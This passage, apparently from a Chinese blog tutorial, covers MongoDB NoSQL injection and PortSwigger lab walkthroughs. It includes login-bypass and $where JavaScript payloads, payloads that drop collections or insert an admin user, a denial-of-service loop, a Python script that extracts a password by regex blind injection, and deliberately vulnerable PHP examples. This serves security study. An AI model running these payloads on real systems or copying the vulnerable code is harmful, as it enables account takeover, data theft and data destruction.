    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql62.png">

  
</figure>
</p>
<p>可以看见也是成功登录</p>
<p>这里也吧M师傅的JavaScript注入的一些笔记写进来，因为算是同一个知识点了只不过师傅用的是where这个方法</p>
<p>example：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">db</span><span class="o">.</span><span class="nx">users</span><span class="o">.</span><span class="nx">find</span><span class="p">({</span> <span class="nv">$where</span><span class="o">:</span> <span class="s2">&#34;function(){return(this.username == </span><span class="si">$userData</span><span class="s2">)}&#34;</span> <span class="p">})</span>
</span></span></code></pre></div><p>构造延迟：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">db</span><span class="o">.</span><span class="nx">users</span><span class="o">.</span><span class="nx">find</span><span class="p">({</span> <span class="nv">$where</span><span class="o">:</span> <span class="s2">&#34;function(){return(this.username == &#39;a&#39;; sleep(5000))}&#34;</span> <span class="p">})</span>
</span></span></code></pre></div><ul>
<li><strong>MongoDB 2.4 之前</strong></li>
</ul>
<p>在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。</p>
<p>如下所示，发送以下数据后，如果有回显的话将获取当前数据库下所有的集合名：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">password</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;;(function(){return(tojson(db.getCollectionNames()))})();var a=&#39;</span><span class="mi">1</span>
</span></span></code></pre></div><ul>
<li><strong>MongoDB 2.4 之后</strong></li>
</ul>
<p>MongoDB 2.4 之后 <code>db</code> 属性访问不到了，但我们应然可以构造万能密码。如果此时我们发送以下这几种数据：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">password</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;;return true//
</span></span></span><span class="line"><span class="cl"><span class="s1">或
</span></span></span><span class="line"><span class="cl"><span class="s1">username=1&amp;password=1&#39;</span><span class="p">;</span><span class="k">return</span> <span class="k">true</span><span class="p">;</span><span class="k">var</span> <span class="nx">a</span><span class="o">=</span><span class="err">&#39;</span><span class="mi">1</span>
</span></span></code></pre></div><p>也是可以查出所有信息的
DOS的一个playload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">password</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;;(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date&lt;5000); return Math.max();})();var a=&#39;</span><span class="mi">1</span>
</span></span></code></pre></div><p>也就是一直循环嘛</p>

<h3 class="relative group">联合查询注入 
    <div id="联合查询注入" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2%e6%b3%a8%e5%85%a5" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>假设后端的 MongoDB 查询语句使用了字符串拼接：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">string</span> <span class="nx">query</span> <span class="o">=</span><span class="s2">&#34;{ username: &#39;&#34;</span> <span class="o">+</span> <span class="nv">$username</span> <span class="o">+</span> <span class="s2">&#34;&#39;, password: &#39;&#34;</span> <span class="o">+</span> <span class="nv">$password</span> <span class="o">+</span> <span class="s2">&#34;&#39; }&#34;</span>
</span></span></code></pre></div><p>当用户正确的用户名密码进行登录时，得到的查询语句是应该这样的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="o">:</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="o">:</span><span class="s1">&#39;123456&#39;</span><span class="p">}</span>
</span></span></code></pre></div><p>如果此时没有很好地对用户的输入进行过滤或者效验，那攻击者便可以构造如下 payload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="nx">admin</span><span class="s1">&#39;, $or: [ {}, {&#39;</span><span class="nx">a</span><span class="s1">&#39;: &#39;</span><span class="nx">a</span><span class="o">&amp;</span><span class="nx">password</span><span class="o">=</span><span class="s1">&#39; }], $comment: &#39;</span><span class="mi">123456</span>
</span></span></code></pre></div><p>拼接入查询语句后相当于执行了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="nv">$or</span><span class="o">:</span> <span class="p">[</span> <span class="p">{},</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="o">:</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;&#39;</span> <span class="p">}],</span> <span class="nv">$comment</span><span class="o">:</span> <span class="s1">&#39;123456&#39;</span><span class="p">}</span>
</span></span></code></pre></div><p>此时，只要用户名是正确的，这个查询就可以成功。这种手法和 SQL 注入比较相似：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span> <span class="nx">logins</span> <span class="nx">where</span> <span class="nx">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span> <span class="k">and</span> <span class="p">(</span><span class="nx">password</span> <span class="k">true</span><span class="o">&lt;&gt;</span> <span class="k">or</span> <span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">=</span><span class="s1">&#39;a&#39;</span> <span class="k">and</span> <span class="nx">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>
</span></span></code></pre></div><p>这样，原本正常的查询语句会被转换为忽略密码的，在无需密码的情况下直接登录用户账号，因为 <code>()</code> 内的条件总是永真的。</p>

<h3 class="relative group">使用 Command 方法造成的注入 
    <div id="使用-command-方法造成的注入" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e4%bd%bf%e7%94%a8-command-%e6%96%b9%e6%b3%95%e9%80%a0%e6%88%90%e7%9a%84%e6%b3%a8%e5%85%a5" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>懒了，这里也是直接贴出来</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$manager</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Manager</span><span class="p">(</span><span class="s2">&#34;mongodb://127.0.0.1:27017&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Command</span><span class="p">(</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;eval&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;db.users.distinct(&#39;username&#39;,{&#39;username&#39;:&#39;</span><span class="si">$username</span><span class="s2">&#39;})&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeCommand</span><span class="p">(</span><span class="s1">&#39;test.users&#39;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$count</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="p">((</span><span class="k">array</span><span class="p">)</span><span class="nv">$user</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;====Login Success====&lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;username:&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;password:&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Login Failed&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>playload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;});db.users.drop();db.user.find({&#39;</span><span class="nx">username</span><span class="s1">&#39;:&#39;</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;});db.users.insert({&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:123456&#34;});db.users.find({&#39;</span><span class="nx">username</span><span class="s1">&#39;:&#39;</span><span class="mi">1</span>
</span></span></code></pre></div>
<h3 class="relative group">盲注 
    <div id="盲注" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e7%9b%b2%e6%b3%a8" aria-label="Anchor">#</a>
    </span>        
    
</h3>

<h4 class="relative group">布尔盲注 
    <div id="布尔盲注" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%b8%83%e5%b0%94%e7%9b%b2%e6%b3%a8" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>index.php</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$manager</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Manager</span><span class="p">(</span><span class="s2">&#34;mongodb://127.0.0.1:27017&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="nv">$username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;password&#39;</span> <span class="o">=&gt;</span> <span class="nv">$password</span>
</span></span><span class="line"><span class="cl"><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;test.users&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$count</span> <span class="o">=</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$count</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$user</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="p">((</span><span class="k">array</span><span class="p">)</span><span class="nv">$user</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;====Login Success====&lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;username:&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;password:&#39;</span> <span class="o">.</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;Login Failed&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>判断playload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">username</span><span class="o">=</span><span class="nx">admin</span><span class="o">&amp;</span><span class="nx">password</span><span class="p">[</span><span class="nv">$regex</span><span class="p">]</span><span class="o">=.</span><span class="p">{</span><span class="nx">number</span><span class="p">}</span>
</span></span></code></pre></div><p>附上m师傅的盲注脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://192.168.226.148/index.php&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="s1">&#39;#&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="s1">&#39;$&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># When the method is GET</span>
</span></span><span class="line"><span class="cl">            <span class="n">get_payload</span> <span class="o">=</span> <span class="s1">&#39;?username=admin&amp;password[$regex]=^</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># When the method is POST</span>
</span></span><span class="line"><span class="cl">            <span class="n">post_payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;password[$regex]&#34;</span><span class="p">:</span> <span class="s1">&#39;^&#39;</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="n">c</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># When the method is POST with JSON</span>
</span></span><span class="line"><span class="cl">            <span class="n">json_payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;{&#34;username&#34;:&#34;admin&#34;, &#34;password&#34;:{&#34;$regex&#34;:&#34;^</span><span class="si">%s</span><span class="s2">&#34;}}&#34;&#34;&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#headers = {&#39;Content-Type&#39;: &#39;application/json&#39;}</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s1">&#39;Login Success&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">c</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 输出如下: </span>
</span></span><span class="line"><span class="cl"><span class="c1"># [+] 1</span>
</span></span><span class="line"><span class="cl"><span class="c1"># [+] 12</span>
</span></span><span class="line"><span class="cl"><span class="c1"># [+] 123</span>
</span></span><span class="line"><span class="cl"><span class="c1"># [+] 1234</span>
</span></span><span class="line"><span class="cl"><span class="c1"># [+] 12345</span>
</span></span><span class="line"><span class="cl"><span class="c1"># [+] 123456</span>
</span></span></code></pre></div>
<h4 class="relative group">时间盲注 
    <div id="时间盲注" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>一些playload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;</span><span class="si">$where</span><span class="s2">&#34;</span><span class="o">:</span> <span class="s2">&#34;sleep(5000)&#34;</span><span class="p">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">admin</span><span class="s1">&#39;+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]===&#34;a&#34;) &amp;&amp; waitTill &gt; new Date()){};}(this)+&#39;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">admin</span><span class="s1">&#39;+function(x){if(x.password[0]===&#34;a&#34;){sleep(5000)};}(this)+&#39;</span>
</span></span></code></pre></div>
<h1 class="relative group">portwigger-lab 
    <div id="portwigger-lab" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#portwigger-lab" aria-label="Anchor">#</a>
    </span>        
    
</h1>

<h3 class="relative group">利用NoSQL 注入提取数据 
    <div id="利用nosql-注入提取数据" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%88%a9%e7%94%a8nosql-%e6%b3%a8%e5%85%a5%e6%8f%90%e5%8f%96%e6%95%b0%e6%8d%ae" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>首先进来还是利用之前给的号进入







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql6.png">

  
</figure>
</p>
<p>发现有个lookup的文件进行搜索user：
<a
  href="https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener"
    target="_blank"
  >https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener</a>







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql7.png">

  
</figure>

所以这里就尝试判断注入是否存在
playload：
<a
  href="https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener%27"
    target="_blank"
  >https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener'</a>







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql8.png">

  
</figure>

<a
  href="https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener%27"
    target="_blank"
  >https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener'</a> &amp;&amp; &lsquo;1&rsquo;==&lsquo;1







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql9.png">

  
</figure>

正常，所以判断是有注入的，那么这里如何获取数据呢？
尽管题目给了admin的账户名，但是对于实战当中我们是没办法知道用户名的，所以我还是以winter这个account做例子
playload：
<a
  href="https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener%27"
    target="_blank"
  >https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener'</a>  &amp;&amp; this.password.length &lt; 30 || &lsquo;a&rsquo;=&lsquo;b







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql10.png">

  
</figure>

<a
  href="https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener%27"
    target="_blank"
  >https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener'</a>  &amp;&amp; this.password.length &lt; 0 || &lsquo;a&rsquo;=&lsquo;b







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql11.png">

  
</figure>

所以这里看见是可以对长度进行判断的，比如我们的密码是<code>peter</code>也就是5位那我们构造下length ==5也是为真的。







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql12.png">

  
</figure>

接下来可以利用</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">winter</span><span class="s1">&#39; &amp;&amp; this.password\[0\]=\=&#39;</span><span class="nx">a</span>
</span></span></code></pre></div><p>进行猜密码，这里可以写脚本也可以burp启动
这里就放出一些例子的图片，不多说明







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql13.png">

  
</figure>








<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="" src="/img/nosql-inject/nosql14.png">

  
</figure>
</p>

<h4 class="relative group">识别字段名称 
    <div id="识别字段名称" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e8%af%86%e5%88%ab%e5%ad%97%e6%ae%b5%e5%90%8d%e7%a7%b0" aria-label="Anchor">#</a>
    </span>        
    
</h4>
<p>由于 MongoDB 处理不需要固定架构的半结构化数据，因此您可能需要先识别集合中的有效字段，然后才能使用 JavaScript 注入提取数据。</p>
<p>例如，要识别MongoDB数据库是否包含字段<code>password</code>，您可以提交以下有效负载：</p>
<pre><code>https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
</code></pre>
<p>再次发送现有字段和不存在字段的有效负载。在此示例中，您知道该<code>username</code>字段存在，因此您可以发送以下有效负载：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">admin</span><span class="s1">&#39; &amp;&amp; this.username!=&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nx">admin</span><span class="s1">&#39; &amp;&amp; this.foo!=&#39;</span>
</span></span></code></pre></div><p>如果该<code>password</code>字段存在，您会期望响应与现有字段 ( ) 的响应相同<code>username</code>，但与不存在字段 ( <code>foo</code>) 的响应不同。</p>
<p>如果您想测试不同的字段名称，您可以通过使用单词列表循环不同的潜在字段名称来执行字典攻击。</p>

<h3 class="relative group">利用NoSQL运算符注入来提取数据 
    <div id="利用nosql运算符注入来提取数据" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%88%a9%e7%94%a8nosql%e8%bf%90%e7%ae%97%e7%ac%a6%e6%b3%a8%e5%85%a5%e6%9d%a5%e6%8f%90%e5%8f%96%e6%95%b0%e6%8d%ae" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>假设有一个接受的程序：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="o">:</span><span class="s2">&#34;wiener&#34;</span><span class="p">,</span><span class="s2">&#34;password&#34;</span><span class="o">:</span><span class="s2">&#34;peter&#34;</span><span class="p">}</span>
</span></span></code></pre></div><p>要测试是否可以注入运算符，您可以尝试将<code>$where</code>运算符添加为附加参数，然后发送一个条件计算结果为 false 的请求，以及另一个计算结果为 true 的请求。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;wiener&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;peter&#34;</span><span class="p">,</span> <span class="nt">&#34;$where&#34;</span><span class="p">:</span><span class="s2">&#34;0&#34;</span><span class="p">}</span>
